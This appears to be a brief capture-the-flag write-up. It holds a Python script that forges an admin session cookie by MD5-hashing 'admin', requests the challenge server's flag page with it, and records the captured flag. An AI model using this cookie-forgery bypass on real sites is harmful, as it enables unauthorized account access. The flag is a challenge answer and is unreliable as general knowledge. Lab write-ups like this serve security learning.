
I love biscuits, chocolates and …….. ? 

http://kicyber2024-3213b6d228ae-webserver4-0.chals.io

import requests,hashlib
URL="http://kicyber2024-3213b6d228ae-webserver4-0.chals.io"
session = hashlib.md5("admin".encode()).hexdigest()
r = requests.get(URL+"/flag.php", cookies={"session":session})
print(r.text)

![[Pasted image 20240811010355.png]]


the flag is 

```
KPMG_CTF{XHrHgWjUOnIenqwFxDV9PGzo0tLt_y0YpTsprSf3EN1ZoDrQ_mmmNYCcu0LKGo13TAPXQm8oA4R_rxPq7fadxrkzjZQd6fUze9aKQZxQ}
```